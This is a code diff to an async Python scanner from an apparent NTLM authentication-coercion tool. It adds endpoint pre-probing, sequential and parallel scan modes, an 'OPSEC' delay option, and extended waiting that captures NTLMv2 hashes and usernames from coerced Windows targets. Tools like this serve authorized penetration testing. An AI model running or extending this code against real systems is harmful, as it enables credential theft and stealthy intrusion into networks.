@@ -63,6 +63,8 @@ class Scanner:
         # Track targets confirmed vulnerable (for --stop-on-vulnerable)
         self._vulnerable_targets: set[str] = set()
         self._vulnerable_lock = asyncio.Lock()
+        # Track reachable endpoints (pre-flight probe results)
+        self._reachable: dict[str, set[tuple[str, str, str]]] = {}
 
     def _unc_port(self, transport: Transport) -> int:
         """Port to embed in UNC paths.
@@ -180,19 +182,195 @@ class Scanner:
 
         return self.stats
 
+    async def _probe_endpoints(self, methods: list[CoercionMethod]) -> None:
+        """Pre-flight probe: test connectivity to each unique (pipe, uuid, version).
+
+        Caches results in self._reachable[target] = set of reachable (pipe, uuid, version) tuples.
+        This both:
+        1. Filters out unreachable endpoints so we don't waste time attempting them later
+        2. Warms the connection pool — sessions are cached for reuse by trigger calls
+        """
+        if not self._pool:
+            return
+
+        # Extract unique bindings from all methods
+        unique_bindings: set[tuple[str, str, str]] = set()
+        for method in methods:
+            for binding in method.pipe_bindings:
+                unique_bindings.add((binding.pipe, binding.uuid, binding.version))
+
+        binding_list = [
+            PipeBinding(pipe=p, uuid=u, version=v) for p, u, v in unique_bindings
+        ]
+
+        log.info("Pre-flight probing %d unique endpoints", len(binding_list))
+        self.console.print(
+            f"[dim]Probing {len(binding_list)} unique endpoints "
+            f"({len(self.config.targets)} targets)…[/]"
+        )
+
+        async def _probe_one(target: str, binding: PipeBinding) -> None:
+            """Probe a single (target, binding) pair."""
+            async with self._semaphore:
+                try:
+                    await self._pool.get_session(target, binding)  # type: ignore[union-attr]
+                    # Success — record as reachable
+                    key = (binding.pipe, binding.uuid, binding.version)
+                    self._reachable.setdefault(target, set()).add(key)
+                except Exception as e:
+                    # Failed — log once per binding (not per target)
+                    err_str = str(e).lower()
+                    if "access_denied" in err_str or "access denied" in err_str:
+                        log.debug(
+                            "Probe %s @ %s: ACCESS_DENIED",
+                            binding.pipe,
+                            target,
+                        )
+                    elif "not_registered" in err_str or "cannot_support" in err_str:
+                        log.debug(
+                            "Probe %s @ %s: NOT_AVAILABLE",
+                            binding.pipe,
+                            target,
+                        )
+                    elif "timed out" in err_str or "timeout" in err_str:
+                        log.debug("Probe %s @ %s: TIMEOUT", binding.pipe, target)
+                    else:
+                        log.debug(
+                            "Probe %s @ %s: %s",
+                            binding.pipe,
+                            target,
+                            e.__class__.__name__,
+                        )
+
+        # Run all probes concurrently
+        tasks = [
+            asyncio.create_task(_probe_one(target, binding))
+            for target in self.config.targets
+            for binding in binding_list
+        ]
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Report summary
+        for target in self.config.targets:
+            reachable_count = len(self._reachable.get(target, set()))
+            log.info(
+                "Target %s: %d/%d endpoints reachable",
+                target,
+                reachable_count,
+                len(binding_list),
+            )
+            if reachable_count > 0:
+                self.console.print(
+                    f"[dim]{target}: {reachable_count}/{len(binding_list)} endpoints reachable[/]"
+                )
+
     async def _run_scan(self, methods: list[CoercionMethod]) -> None:
         """Scan mode: try all path styles per method to detect vulnerabilities."""
         allowed = self.config.transport
         scan_start = time.monotonic()
 
-        # Build a mapping from target to its tasks for cancellation
-        target_tasks: dict[str, list[asyncio.Task[None]]] = {}
+        # Pre-flight probe to filter out unreachable endpoints
+        await self._probe_endpoints(methods)
+
+        if self.config.stop_on_vulnerable:
+            # Method-sequential, target-parallel: try one method at a time across
+            # all non-vulnerable targets, stop when all targets are vulnerable
+            await self._run_scan_sequential(methods, allowed)
+        else:
+            # Full parallel scan: all methods × targets × bindings × path_styles upfront
+            await self._run_scan_parallel(methods, allowed)
+
+        # Drain period: keep the listener running while ongoing handshakes
+        # complete, then sweep results to upgrade ACCESSIBLE → VULNERABLE
+        # and enrich VULNERABLE results that are missing auth_user.
+        await self._drain_callbacks(scan_start)
+
+    async def _run_scan_sequential(
+        self, methods: list[CoercionMethod], allowed: set[Transport]
+    ) -> None:
+        """Sequential scan: one method at a time, all remaining targets in parallel.
+
+        For --stop-on-vulnerable mode. Guarantees methods are tried in priority order.
+        Only tries the default path_style (first in path_styles list) to minimize noise.
+        """
+        remaining = set(self.config.targets)
+
+        for method in methods:
+            if not remaining:
+                break  # All targets confirmed vulnerable
+
+            # Filter to reachable bindings only
+            reachable_bindings = []
+            for binding in method.pipe_bindings:
+                key = (binding.pipe, binding.uuid, binding.version)
+                if any(
+                    key in self._reachable.get(target, set()) for target in remaining
+                ):
+                    reachable_bindings.append(binding)
+
+            if not reachable_bindings:
+                continue  # No reachable bindings for this method on any remaining target
+
+            # Use only the first path_style (default) for --stop-on-vulnerable
+            if not method.path_styles:
+                continue
+            default_transport_name, default_path_style = method.path_styles[0]
+            default_transport = (
+                Transport.HTTP if default_transport_name == "http" else Transport.SMB
+            )
+            if default_transport not in allowed:
+                continue
+
+            # Create tasks for all remaining targets × reachable bindings
+            tasks = []
+            for target in list(remaining):
+                reachable = self._reachable.get(target, set())
+                for binding in reachable_bindings:
+                    key = (binding.pipe, binding.uuid, binding.version)
+                    if key not in reachable:
+                        continue
+                    task = asyncio.create_task(
+                        self._attempt(
+                            target,
+                            method,
+                            binding,
+                            transport_override=default_transport,
+                            path_style_override=default_path_style,
+                        )
+                    )
+                    tasks.append(task)
+
+            if tasks:
+                log.debug(
+                    "Sequential scan: method %s (priority %d) — %d tasks for %d targets",
+                    method.function_name,
+                    method.priority,
+                    len(tasks),
+                    len(remaining),
+                )
+                await asyncio.gather(*tasks, return_exceptions=True)
+
+                # Remove vulnerable targets from remaining set
+                remaining -= self._vulnerable_targets
+
+    async def _run_scan_parallel(
+        self, methods: list[CoercionMethod], allowed: set[Transport]
+    ) -> None:
+        """Parallel scan: all methods × targets × bindings × path_styles upfront.
+
+        For full scan mode (no --stop-on-vulnerable). Tries all path_styles to
+        identify every vulnerable method.
+        """
         all_tasks: list[asyncio.Task[None]] = []
 
         for target in self.config.targets:
-            target_tasks[target] = []
+            reachable = self._reachable.get(target, set())
             for method in methods:
                 for binding in method.pipe_bindings:
+                    # Skip unreachable bindings
+                    key = (binding.pipe, binding.uuid, binding.version)
+                    if key not in reachable:
+                        continue
                     for transport_name, path_style in method.path_styles:
                         transport = (
                             Transport.HTTP
@@ -210,40 +388,10 @@ class Scanner:
                                 path_style_override=path_style,
                             )
                         )
-                        target_tasks[target].append(task)
                         all_tasks.append(task)
 
-        # If stop_on_vulnerable is enabled, monitor for vulnerable targets
-        # and cancel remaining tasks for that target
-        if self.config.stop_on_vulnerable:
-
-            async def cancel_target_tasks() -> None:
-                """Monitor vulnerable targets and cancel pending tasks."""
-                while all_tasks:
-                    await asyncio.sleep(0.1)  # Check every 100ms
-                    # Check which targets became vulnerable
-                    for target in list(target_tasks.keys()):
-                        if target in self._vulnerable_targets:
-                            # Cancel all remaining tasks for this target
-                            for task in target_tasks[target]:
-                                if not task.done():
-                                    task.cancel()
-                            del target_tasks[target]
-                    # Exit if all tasks done
-                    if all(task.done() for task in all_tasks):
-                        break
-
-            # Run cancellation monitor alongside tasks
-            monitor_task = asyncio.create_task(cancel_target_tasks())
-            await asyncio.gather(*all_tasks, monitor_task, return_exceptions=True)
-        else:
-            # Normal mode: just wait for all tasks
-            await asyncio.gather(*all_tasks, return_exceptions=True)
-
-        # Drain period: keep the listener running while ongoing handshakes
-        # complete, then sweep results to upgrade ACCESSIBLE → VULNERABLE
-        # and enrich VULNERABLE results that are missing auth_user.
-        await self._drain_callbacks(scan_start)
+        log.debug("Parallel scan: %d total tasks created", len(all_tasks))
+        await asyncio.gather(*all_tasks, return_exceptions=True)
 
     # ── COERCE: targeted single-path triggers (no local listener) ──
 
@@ -411,6 +559,10 @@ class Scanner:
 
         try:
             async with self._semaphore:
+                # Delay for OPSEC if configured
+                if self.config.delay > 0:
+                    await asyncio.sleep(self.config.delay)
+
                 # Early exit if target already confirmed vulnerable
                 if self.config.stop_on_vulnerable:
                     async with self._vulnerable_lock:
@@ -459,14 +611,16 @@ class Scanner:
                         TriggerResult.VULNERABLE,
                         TriggerResult.ACCESSIBLE,
                     ):
+                        # Two-stage await for token-based correlation:
+                        # Stage 1: Normal timeout (callback_timeout)
                         try:
                             callback = await asyncio.wait_for(
                                 future, timeout=self.config.callback_timeout
                             )
+                            # Token-based resolution succeeded
                             result.callback_received = True
                             result.source_ip = callback.source_ip
                             result.result = TriggerResult.VULNERABLE
-                            # Propagate NTLM metadata from SMB2 handshake
                             if callback.ntlmv2_hash:
                                 result.ntlmv2_hash = callback.ntlmv2_hash
                             if callback.username:
@@ -476,24 +630,63 @@ class Scanner:
                                     else callback.username
                                 )
                         except asyncio.TimeoutError:
-                            # Token-based correlation failed (FIFO race).
-                            # Fall back to timestamp check: did ANY callback
-                            # arrive from this target since we fired?
-                            fallback = listener.get_callback_since(target, t_before)
-                            if fallback is not None:
-                                result.callback_received = True
-                                result.result = TriggerResult.VULNERABLE
-                                result.source_ip = fallback.source_ip
-                                if fallback.ntlmv2_hash:
-                                    result.ntlmv2_hash = fallback.ntlmv2_hash
-                                if fallback.username:
-                                    result.auth_user = (
-                                        f"{fallback.domain}\\{fallback.username}"
-                                        if fallback.domain
-                                        else fallback.username
-                                    )
+                            # Stage 2: Check if a connection arrived but handshake is in progress
+                            if listener.has_connection_from(target, t_before):
+                                # Connection detected — give handshake more time to reach TREE_CONNECT
                                 log.debug(
-                                    "Timestamp fallback: %s %s::%s upgraded to VULNERABLE",
+                                    "Connection from %s detected, extending wait for TREE_CONNECT...",
+                                    target,
+                                )
+                                try:
+                                    callback = await asyncio.wait_for(
+                                        future,
+                                        timeout=10.0,  # Extended timeout for TREE_CONNECT
+                                    )
+                                    # Token resolved via TREE_CONNECT after extended wait
+                                    result.callback_received = True
+                                    result.source_ip = callback.source_ip
+                                    result.result = TriggerResult.VULNERABLE
+                                    if callback.ntlmv2_hash:
+                                        result.ntlmv2_hash = callback.ntlmv2_hash
+                                    if callback.username:
+                                        result.auth_user = (
+                                            f"{callback.domain}\\{callback.username}"
+                                            if callback.domain
+                                            else callback.username
+                                        )
+                                    log.debug(
+                                        "TREE_CONNECT completed after extended wait: %s %s::%s",
+                                        target,
+                                        method.protocol_short,
+                                        method.function_name,
+                                    )
+                                except asyncio.TimeoutError:
+                                    # TREE_CONNECT never arrived — fall back to timestamp
+                                    fallback = listener.get_callback_since(
+                                        target, t_before
+                                    )
+                                    if fallback is not None:
+                                        result.callback_received = True
+                                        result.result = TriggerResult.VULNERABLE
+                                        result.source_ip = fallback.source_ip
+                                        if fallback.ntlmv2_hash:
+                                            result.ntlmv2_hash = fallback.ntlmv2_hash
+                                        if fallback.username:
+                                            result.auth_user = (
+                                                f"{fallback.domain}\\{fallback.username}"
+                                                if fallback.domain
+                                                else fallback.username
+                                            )
+                                        log.debug(
+                                            "Timestamp fallback: %s %s::%s upgraded to VULNERABLE",
+                                            target,
+                                            method.protocol_short,
+                                            method.function_name,
+                                        )
+                            else:
+                                # No connection at all — target didn't call back
+                                log.debug(
+                                    "No callback from %s for %s::%s",
                                     target,
                                     method.protocol_short,
                                     method.function_name,
